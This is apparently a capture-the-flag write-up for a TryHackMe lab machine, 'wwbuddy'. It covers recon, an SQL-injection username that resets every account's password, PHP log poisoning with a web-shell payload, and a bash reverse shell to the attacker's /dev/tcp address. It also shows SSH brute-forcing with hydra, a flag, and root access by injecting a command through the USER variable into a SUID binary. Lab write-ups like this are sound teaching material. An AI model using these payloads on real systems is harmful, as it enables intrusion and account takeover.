# recon
- nmap
```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 66:75:21:b4:93:4a:a5:a7:df:f4:01:80:19:cf:ff:ad (RSA)
|   256 a6:dd:30:3b:e4:96:ba:ab:5f:04:3b:9e:9e:92:b7:c0 (ECDSA)
|_  256 04:22:f0:d2:b0:34:45:d4:e5:4d:ad:a2:7d:cd:00:41 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Login
|_Requested resource was http://10.10.154.139/login/
```
- gobuster
```
/admin (Status: 301)
/api (Status: 301)
/change (Status: 301)
/chat.php (Status: 200)
/config.php (Status: 200)
/footer.html (Status: 200)
/header.html (Status: 200)
/images (Status: 301)
/index.php (Status: 302)
/js (Status: 301)
/login (Status: 301)
/logout.php (Status: 302)
/profile (Status: 301)
/register (Status: 301)
/server-status (Status: 403)
/styles (Status: 301)
```
- junks
var users = {"fc18e5f4aa09bbbb7fdedf5e277dda00":"WWBuddy"};
gu2rks var uid = "74a455114e02c520d82c0f4d3dfa1d06";
kurohat var uid = acd13a68b6ec2ce0b11137ff9da8908c

- /admin/access.log
192.168.0.139 2020-07-24 22:54:34 WWBuddy fc18e5f4aa09bbbb7fdedf5e277dda00
192.168.0.139 2020-07-24 22:56:09 Roberto b5ea6181006480438019e76f8100249e
10.11.14.220 2020-09-04 17:26:40 gu2rks 74a455114e02c520d82c0f4d3dfa1d06 

- /api/messages/?uid=<useridhere>: to user's profile page:
```html
<div class="profcontent">
      <img class="profilePic2" src="../images/profile.jpg">
      <p class="profileName2">Roberto</p>
    </div>
    <div class="proinfo">
      <p><strong>Country:</strong>Brazil</p>
      <p><strong>E-mail:</strong>roberto@wwbuddy.com</p>
      <p><strong>Birthday:</strong>04/14/1995</p>
      <p><strong>Description:</strong>I'm a Brazilian guy who likes to write code, full stack developer working for WWBuddy, open for new friendships :D</p>
</div>
```

I try to inject `' or 1=1 -- -` in different form but didnt fine anything. after I poking around for a while, I found out that I can change username and password. So my idea was change username to `' or 1=1 -- -` then visit the `/change/` and change the password. sine the user name is `' or 1=1 -- -` it will fool the webpage and change all user's password on the website, include *wwwbudy* and *roberto*

so let do it and log out from current user, now try to login as *roberto* using the password we reseted too.


Boom it works !! note that there is one more user that we didnt know about. *henry*. After reading the conversation between Roberto and Henry you will know:
- ssh defualt password is **employee birthday** 
  - roberto 04/14/1995, he changed his password 04141995
  - henry Birthday:12/12/1212
- they talking about hiring a new girl

I then log into with *henry*. he is only person who can visit to `/admin`
```
Hey Henry, i didn't made the admin functions for this page yet, but at least you can see who's trying to sniff into our site here.
```
I try to ssh to the server using henry birthday which is a fake birthday lol, he born 1212 but anyway it is worth trying.. it didnt works tho. Tho check if `/admin` is a .php, I visit `/admin/index.php` and it is what I think

So the plan is do log posioning by insert a php code to `/admin/acess.log`. the malicouse code will be execute that in `/admin/index.php` when we visit it using henry account. 

let prove/check that this plan works, we log out from henry and create dummy account with username `<?php echo "kurohat was here\n"; ?>`. now log in to the dummy accout and visit `/admin/` yes it wouldnt works but the username is now saved in `acess.log`. logout and log into the web using *henry* credential, now visit `/admin`
```
 10.11.14.220 2020-09-13 21:30:37 kurohat was here addafe671bc235593d17a324fe317d2a 
```
bing go, it works !! now let craft a good payload such as `<?php system($_REQUEST['cmd']); ?>`. Repeat the same process as before but using `<?php system($_REQUEST['cmd']); ?>` as username instead. now visit `/admin/index.php?cmd=whoami`
```
 10.11.14.220 2020-09-13 21:35:06 www-data addafe671bc235593d17a324fe317d2a 
```
seem like we are www-data user
# foothold
let get reverse shell by visit `/admin/index.php?cmd=bash+-c+%27bash+-i+%3E%26+/dev/tcp/10.11.14.220/6969+0%3E%261%27`. now recon
```console
www-data@wwbuddy:/var/www/html$ ls /home
ls /home
jenny
roberto
wwbuddy
www-data@wwbuddy:/var/www/html$ ls /home/wwbuddy
ls /home/wwbuddy
ls: cannot open directory '/home/wwbuddy': Permission denied
www-data@wwbuddy:/var/www/html$ ls /home/roberto
ls /home/roberto
ls: cannot open directory '/home/roberto': Permission denied
www-data@wwbuddy:/var/www/html$ ls /home/jenny
ls /home/jenny
ls: cannot open directory '/home/jenny': Permission denied
www-data@wwbuddy:/var/www/html$ ls
```
3 users and we cannot access it with *www-data*


wget http://10.11.14.220:8080/suid3num.py


```
[~] Custom SUID Binaries (Interesting Stuff)
------------------------------
/bin/authenticate
```
let try it out
```
www-data@wwbuddy:/var/www/html$ authenticate
authenticate
You need to be a real user to be authenticated.
```
get to our kali and use Ghidra to reverse engineer it.
```c
undefined8 main(void)

{
  __uid_t __uid;
  int iVar1;
  char *__src;
  long in_FS_OFFSET;
  undefined8 local_48;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined4 local_20;
  undefined local_1c;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  __uid = getuid();
  if ((int)__uid < 1000) {
    puts("You need to be a real user to be authenticated.");
  }
  else {
    iVar1 = system("groups | grep developer");
    if (iVar1 == 0) {
      puts("You are already a developer.");
    }
    else {
      __src = getenv("USER");
      __uid = getuid();
      setuid(0);
      local_48 = 0x20646f6d72657375;
      local_40 = 0x6c6576656420472d;
      local_38 = 0x207265706f;
      local_30 = 0;
      local_28 = 0;
      local_20 = 0;
      local_1c = 0;
      strncat((char *)&local_48,__src,0x14);
      system((char *)&local_48);
      puts("Group updated");
      setuid(__uid);
      system("newgrp developer");
    }
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```


```
www-data@wwbuddy:/var/www/html$ cat /var/log/mysql/general.log
cat /var/log/mysql/general.log
/usr/sbin/mysqld, Version: 5.7.30-0ubuntu0.18.04.1 ((Ubuntu)). started with:
Tcp port: 3306  Unix socket: /var/run/mysqld/mysqld.sock
Time                 Id Command    Argument
2020-07-25T14:35:56.331972Z	    6 Query	show global variables where Variable_Name like "%general%"
2020-07-25T14:36:04.753758Z	    6 Quit	
2020-07-25T14:41:25.299513Z	    8 Connect	root@localhost on  using Socket
2020-07-25T14:41:25.299556Z	    8 Connect	Access denied for user 'root'@'localhost' (using password: YES)
2020-07-25T14:41:25.309432Z	    9 Connect	root@localhost on  using Socket
2020-07-25T14:41:25.309467Z	    9 Connect	Access denied for user 'root'@'localhost' (using password: YES)
2020-07-25T14:41:25.317881Z	   10 Connect	root@localhost on  using Socket
2020-07-25T14:41:25.317916Z	   10 Connect	Access denied for user 'root'@'localhost' (using password: NO)
2020-07-25T14:56:02.127981Z	   11 Connect	root@localhost on app using Socket
2020-07-25T14:56:02.128534Z	   11 Quit	
2020-07-25T15:01:40.140340Z	   12 Connect	root@localhost on app using Socket
2020-07-25T15:01:40.143115Z	   12 Prepare	SELECT id, username, password FROM users WHERE username = ?
2020-07-25T15:01:40.143760Z	   12 Execute	SELECT id, username, password FROM users WHERE username = 'RobertoyVnocsXsf%X68wf'
2020-07-25T15:01:40.147944Z	   12 Close stmt	
2020-07-25T15:01:40.148109Z	   12 Quit	
2020-07-25T15:02:00.018314Z	   13 Connect	root@localhost on app using Socket
2020-07-25T15:02:00.018975Z	   13 Prepare	SELECT id, username, password FROM users WHERE username = ?
2020-07-25T15:02:00.019056Z	   13 Execute	SELECT id, username, password FROM users WHERE username = 'Roberto'
2020-07-25T15:02:00.089575Z	   13 Close stmt	
2020-07-25T15:02:00.089631Z	   13 Quit	
2020-07-25T15:02:00.093503Z	   14 Connect	root@localhost on app using Socket
2020-07-25T15:02:00.093662Z	   14 Query	SELECT name FROM countries
2020-07-25T15:02:00.094135Z	   14 Query	SELECT country, email, birthday, description FROM users WHERE id = 'b5ea6181006480438019e76f8100249e'
2020-07-25T15:02:00.096687Z	   14 Query	SELECT * FROM messages WHERE sender = 'b5ea6181006480438019e76f8100249e' OR receiver = 'b5ea6181006480438019e76f8100249e'
2020-07-25T15:02:00.097056Z	   14 Query	SELECT id,username FROM users WHERE id IN ('fc18e5f4aa09bbbb7fdedf5e277dda00', 'be3308759688f3008d01a7ab12041198') ORDER BY username
2020-07-25T15:02:00.097174Z	   14 Quit	
2020-07-25T15:06:48.352118Z	   15 Connect	root@localhost on app using Socket
2020-07-25T15:06:48.352492Z	   15 Quit	
```


```
$ ls
importante.txt
$ cat importante.txt
A Jenny vai ficar muito feliz quando ela descobrir que foi contratada :DD

Não esquecer que semana que vem ela faz 26 anos, quando ela ver o presente que eu comprei pra ela, talvez ela até anima de ir em um encontro comigo.


THM{g4d0_d+_kkkk}
```
to eng
```
Jenny will be very happy when she finds out she was hired: DD

Do not forget that next week she turns 26, when she sees the gift I bought for her, maybe she even encourages to go on a date with me.
```

```
$ id 
uid=1001(roberto) gid=1001(roberto) groups=1001(roberto),200(developer)
$ ls -la importante.txt
-rw-rw-r-- 1 roberto roberto 246 Jul 27 21:25 importante.txt
```
Jul have 31 days. 3rd agut -> 3/8/1994. let make a wordlist
```
03081994
19940803
08031994
03-08-1994
1994-08-03
08-03-1994
03/08/1994
1994/08/03
08/03/1994
```

```console
kali@kali:~/THM/wwbuddy$ nano pass.txt # word list
kali@kali:~/THM/wwbuddy$ hydra -f -l jenny -P pass.txt -t 64 10.10.66.120 ssh
Hydra v9.1-dev (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-14 16:15:42
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 9 tasks per 1 server, overall 9 tasks, 9 login tries (l:1/p:9), ~1 try per task
[DATA] attacking ssh://10.10.66.120:22/
[22][ssh] host: 10.10.66.120   login: jenny   password: [somethinghere]
```

```
$ bash
jenny@wwbuddy:~$ echo $USER
jenny
jenny@wwbuddy:~$ export USER="jenny; bash"
jenny@wwbuddy:~$ echo $USER
jenny; bash
jenny@wwbuddy:~$ authenticate
root@wwbuddy:~# cat /root/root.txt
```